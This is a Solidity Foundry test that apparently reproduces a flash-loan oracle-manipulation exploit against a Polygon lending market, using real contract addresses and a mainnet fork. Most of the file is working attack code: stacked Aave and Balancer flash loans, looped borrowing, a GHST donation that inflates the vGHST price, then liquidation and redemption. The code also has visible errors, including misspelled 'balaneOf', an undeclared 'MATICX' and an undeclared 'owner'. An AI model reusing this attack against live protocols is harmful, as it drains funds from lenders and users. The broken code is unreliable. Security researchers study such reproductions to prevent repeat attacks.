// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1651932529874853888
// https://twitter.com/peckshield/status/1651923235603361793
// https://twitter.com/Mudit__Gupta/status/1651958883634536448
// @TX
// https://polygonscan.com/tx/0x10f2c28f5d6cd8d7b56210b4d5e0cece27e45a30808cd3d3443c05d4275bb008
// @Summary
// VGHSTOracle was donate to manipulate 
// STOP LISTING TOKENS WHOSE PRICE CAN BE MANIPULATED ATOMICALLY
// Cream, Hundred, bZx, Loadstar, bonq.... same exploit

interface IVGHST is IERC20 {
    function enter(uint256 _amount) external returns(uint256);
    function leave(uint256 _amount) external;
    function convertVGHST(uint256 _share) external view returns(uint256 _ghst);
}

interface IDMMLP {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata callbackData
    ) external;
}

contract ContractTest is Test {
    IERC20 GHST = IERC20(0x385Eeac5cB85A38A9a07A70c73e0a3271CfB54A7);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 DAI = IERC20(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063);
    IERC20 WBTC = IERC20(0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    IERC20 miMATIC = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);
    IERC20 MATIX = IERC20(0xfa68FB4628DFF1028CFEc22b4162FCcd0d45efb6);
    IERC20 stMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
    IERC20 gDAI = IERC20(0x91993f2101cc758D0dEB7279d41e880F7dEFe827);
    IERC20 wstETH = IERC20(0x03b54A6e9a984069379fae1a4fC4dBAE93B3bCCD);
    IVGHST vGHST = IVGHST(0x51195e21BDaE8722B29919db56d95Ef51FaecA6C);
    ICErc20Delegate oUSDT = ICErc20Delegate(0x1372c34acC14F1E8644C72Dad82E3a21C211729f);
    ICErc20Delegate oMATIC = ICErc20Delegate(0xE554E874c9c60E45F1Debd479389C76230ae25A8);
    ICErc20Delegate oWBTC = ICErc20Delegate(0x3B9128Ddd834cE06A60B0eC31CCfB11582d8ee18);
    ICErc20Delegate oDAI = ICErc20Delegate(0x2175110F2936bf630a278660E9B6E4EFa358490A);
    ICErc20Delegate oWETH = ICErc20Delegate(0xb2D9646A1394bf784E376612136B3686e74A325F);
    ICErc20Delegate oUSDC = ICErc20Delegate(0xEBb865Bf286e6eA8aBf5ac97e1b56A76530F3fBe);
    ICErc20Delegate oMATICX = ICErc20Delegate(0xAAcc5108419Ae55Bc3588E759E28016d06ce5F40);
    ICErc20Delegate ostMATIC = ICErc20Delegate(0xDc3C5E5c01817872599e5915999c0dE70722D07f);
    ICErc20Delegate owstWETH = ICErc20Delegate(0xf06edA703C62b9889C75DccDe927b93bde1Ae654);
    ICErc20Delegate ovGHST = ICErc20Delegate(0xE053A4014b50666ED388ab8CbB18D5834de0aB12);
    IUnitroller unitroller = IUnitroller(0x8849f1a0cB6b5D6076aB150546EddEe193754F1C);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAaveFlashloan aaveV2 = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IDMMLP DMMLP = IDMMLP(0xAb08b0C9DADC343d3795dAE5973925c3b6e39977);

    Exploiter exploiter;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork(
            "polygon",
            42054768
        );
        cheats.label(address(GHST), "GHST");
        cheats.label(address(USDC), "USDC");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(WMATIC), "WMATIC");
        cheats.label(address(DAI), "DAI");
        cheats.label(address(WBTC), "WBTC");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(miMATIC), "miMATIC");
        cheats.label(address(MATIX), "MATIX");
        cheats.label(address(stMATIC), "stMATIC");
        cheats.label(address(gDAI), "gDAI");
        cheats.label(address(wstETH), "wstETH");
        cheats.label(address(MATIX), "MATIX");
        cheats.label(address(vGHST), "vGHST");
        cheats.label(address(oMATIC), "oMATIC");
        cheats.label(address(oWBTC), "oWBTC");
        cheats.label(address(oDAI), "oDAI");
        cheats.label(address(oWETH), "oWETH");
        cheats.label(address(oUSDC), "oUSDC");
        cheats.label(address(oMATICX), "oMATICX");
        cheats.label(address(owstWETH), "owstWETH");
        cheats.label(address(ovGHST), "ovGHST");
        cheats.label(address(aaveV3), "aaveV3");
        cheats.label(address(aaveV2), "aaveV2");
        cheats.label(address(Balancer), "Balancer");
        cheats.label(address(unitroller), "unitroller");
    }

    function testExploit() external {
        deal(address(this), 0);
        exploiter = new Exploiter();
        vGHST.approve(address(ovGHST), type(uint).max);
        GHST.approve(address(vGHST), type(uint).max);
        USDT.approve(address(oUSDT), type(uint).max);
        aaveV3Flashloan();
    }
    // aaveV3, aaveV2 FlashLoan callback
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        if(msg.sender == address(aaveV3)) {
            GHST.approve(msg.sender, type(uint).max);
            USDC.approve(msg.sender, type(uint).max);
            USDT.approve(msg.sender, type(uint).max);
            aaveV2Flashloan();
            return true;
        } else {
            USDC.approve(msg.sender, type(uint).max);
            USDT.approve(msg.sender, type(uint).max);
            balancerFlashloan();
            swapTokenToUSD();
            return true;
        }
    }

    // balancer FlashLoan callback
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        vGHST.enter(294_000 * 1e18);
        oUSDT.mint(USDT.balanceOf(address(this))); // deposit USDT collateral

        address[] memory cTokens = new address[](1);
        cTokens[0] = address(oUSDT);
        unitroller.enterMarkets(cTokens);
        borrowAll(); // borrow asset

        USDC.transfer(address(exploiter), 24_500_000 * 1e6);
        vGHST.transfer(address(exploiter), vGHST.balanceOf(address(this)));
        exploiter.mint(24, address(this)); // Build leveraged debt positions by USDC collateral

        console.log("the price of vGHST before donate:", vGHST.convertVGHST(1e18));
        GHST.transfer(address(vGHST), 1_656_000 * 1e18); // VGHSTOracle price manipulation
        console.log("the price of vGHST after donate:", vGHST.convertVGHST(1e18));

        liquidateLeveragedDebt(); // liquidate Leveraged Debt
        oUSDC.redeem(oUSDC.balanceOf(address(this))); // Get back USDC collateral
        oUSDC.redeemUnderlying(USDC.balanceOf(address(oUSDC))); // ?
        vGHST.leave(vGHST.balanceOf(address(this)));

        USDC.transfer(address(Balancer), amounts[0]);
        USDT.transfer(address(Balancer), amounts[1]);
    }

    function borrowAll() internal {
        oMATIC.borrow(address(oMATIC).balance);
        oWBTC.borrow(WBTC.balanceOf(address(oWBTC)));
        oDAI.borrow(DAI.balanceOf(address(oDAI)));
        oWETH.borrow(WETH.balanceOf(address(oWETH)));
        oUSDC.borrow(USDC.balanceOf(address(oUSDC)));
        oUSDT.borrow(1_160_000 * 1e6);
        oMATICX.borrow(MATICX.balanceOf(address(oMATICX)));
        ostMATIC.borrow(120_000 * 1e18);
        owstWETH.borrow(wstETH.balanceOf(address(owstWETH)));
    }

    function liquidateLeveragedDebt() internal {
        uint256 liquidateAmount = vGHST.balanceOf(address(this));
        for(uint i; i < 24; i++) {
            ovGHST.liquidateBorrow(address(exploiter), liquidateAmount);
            ovGHST.redeemUnderlying(liquidateAmount);
        }
    }

    function swapTokenToUSD() internal {
        address(WMATIC).call{value: address(this).balance}("");
        wstETH.transfer(address(DMMLP), wstETH.balanceOf(address(this)));
        DMMLP.swap(0, 314 * 1e18, address(this), new bytes(0));
        
    }


    function aaveV3Flashloan() internal {
        address[] memory assets = new address[](3);
        assets[0] = address(GHST);
        assets[1] = address(USDC);
        assets[2] = address(USDT);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1_950_000 * 1e18;
        amounts[1] = 6_800_000 * 1e6;
        amounts[2] = 2_300_000 * 1e6;
        uint256[] memory modes = new uint[](3);
        modes[0] = 0;
        modes[1] = 0;
        modes[2] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }
    function aaveV2Flashloan() internal {
        address[] memory assets = new address[](2);
        assets[0] = address(USDC);
        assets[1] = address(USDT);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 13_000_000 * 1e6;
        amounts[1] = 3_250_000 * 1e6;
        uint256[] memory modes = new uint[](2);
        modes[0] = 0;
        modes[1] = 0;
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }
    function balancerFlashloan() internal {
        address[] memory tokens = new address[](2);
        tokens[0] = address(USDC);
        tokens[1] = address(USDT);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 4_700_000 * 1e6;
        amounts[1] = 600_000 * 1e6;
        bytes memory userData = "";
        balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    receive() external payable {}
}

contract Exploiter {
    IERC20 GHST = IERC20(0x385Eeac5cB85A38A9a07A70c73e0a3271CfB54A7);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    ICErc20Delegate oUSDT = ICErc20Delegate(0x1372c34acC14F1E8644C72Dad82E3a21C211729f);
    ICErc20Delegate oUSDC = ICErc20Delegate(0xEBb865Bf286e6eA8aBf5ac97e1b56A76530F3fBe);
    IVGHST vGHST = IVGHST(0x51195e21BDaE8722B29919db56d95Ef51FaecA6C);
    ICErc20Delegate ovGHST = ICErc20Delegate(0xE053A4014b50666ED388ab8CbB18D5834de0aB12);
    IUnitroller unitroller = IUnitroller(0x8849f1a0cB6b5D6076aB150546EddEe193754F1C);
    constructor(){
        owner = msg.sender;
        USDC.approve(address(oUSDC), type(uint).max);
        vGHST.approve(address(ovGHST), type(uint).max);
    }
    function mint(uint256 amountOfOptions, address owner) external {
        oUSDC.mint(USDC.balanceOf(address(this)));
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(oUSDC);
        unitroller.enterMarkets(cTokens);
        ovGHST.borrow(vGHST.balanceOf(address(this)));
        uint256 vGHSTAmount = vGHST.balanceOf(address(this));
        for(uint i; i < amountOfOptions; i++) {
            ovGHST.mint(vGHSTAmount);
            ovGHST.borrow(vGHSTAmount);
        }
        vGHST.transfer(owner, vGHSTAmount);
        ovGHST.transfer(owner, ovGHST.balanceOf(address(this)));
        oUSDT.borrow(USDT.balanceOf(address(oUSDT)));
        oUSDC.borrow(720_000 * 1e6);
        USDT.transfer(owner, USDT.balaneOf(address(this)));
        USDC.transfer(owner, USDC.balaneOf(address(this)));
    }
}
